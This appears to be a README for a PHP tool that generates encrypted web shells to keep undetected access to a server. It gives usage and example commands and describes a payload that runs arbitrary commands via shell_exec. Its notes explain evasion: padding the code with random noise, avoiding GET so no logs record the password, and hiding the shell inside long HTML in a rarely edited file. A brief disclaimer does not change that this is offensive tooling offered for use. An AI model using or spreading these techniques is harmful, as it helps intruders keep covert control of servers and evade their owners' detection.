# wbsh_gen.php
> Generate an encrypted webshell to mantain access to a server.


wbsh_gen.php can be used to create a
<a href="https://en.wikipedia.org/wiki/Web_shell">web shell</a> with an encrypted payload, as a way of keeping it undetected.
The payload is encrypted using the OpenSSL extension avaiable for PHP > 5.3.0. Older PHP versions could require other cryptographic extensions or even a personalized encryption algorithm.
The default cipher is AES-256 in CTR mode, but any cipher supported by the OpenSSL extension can be used through the -c option.

## Usage

```
wbsh_gen.php [option(s)] -p <payload> -k <password> -o <output>

Options:

   -h              Display this help message and exit
   -s              Save the password to a session cookie
   -f              Add a login form to access the web shell
   -p <payload>    The file containing the payload
   -n <field>      The name of the password field
   -k <password>   The password to encrypt the payload
   -i <passfile>   Read the password from file
   -c <cipher>     The cipher algorithm and mode of operation as
                   identified by openssl (example: AES-256-CTR)
   -m POST|GET     The method used to get the password
   -r              Fill the end of the code with random noise
   -o <output>     Save the web shell as <output_file>

```

## Examples


```
	user@host:wbsh$ ./wbsh_gen.php -p payload.php -k secret123 -o ws.php
```


```
	user@host:wbsh$ ./wbsh_gen.php -f -p payload.php -i key.txt -o form.php
```


```
	user@host:wbsh$ ./wbsh_gen.php -f -s -p payload.php -k secret123 -o session.php
```

## Testing and deploying

First, we need a payload to be executed upon entering the correct password. The file payload.php contains a very simple and limited shell-like web interface that allows the execution of arbitrary commands using the native PHP function shell_exec().

For this example, we will create a web shell with a form to enter the password (what can be a really bad idea in a real life scenario). After entering it, the password will be saved into a session cookie until the end of the current session (which can as well be a bad idea, but this is just a demonstration).

```
user@host:wbsh/src$ ./wbsh_gen.php -r -f -s -p payload.php -k mypassword -o evil.php
```

The -r option will fill the end of the PHP code with some random noise, further hiding the legible part of the code.

Now, we can test it using the built-in PHP server by running (assuming your current directory contains the generated file):

```
user@host:wbsh/src$ php -S localhost:8000
```

Then, point your browser to http://localhost:8000/evil.php and have fun!

## Notes and hints

- Do not (and I can't emphasize this enough) do not use this to perform any illegal activity. If you do so, it will be your sole responsability and you must be prepared for the consequences if you get caught.

- The default method used by the generated script to retrieve the password is POST. You can change it by using -m POST|GET. But I would advise you against using GET as it could potentially generate a log entry on the server containing your password.

- Using the -s option to save the password in a session cookie can be very pratical, as you would need to type it only once for each session. The problem is that it could be used by someone to recover your password or even help identifying you.

- A good method to hide the web shell into a server would be to put the malicious code inside another file (preferably one that would not be edited very frequently) right in the middle of some long HTML code.
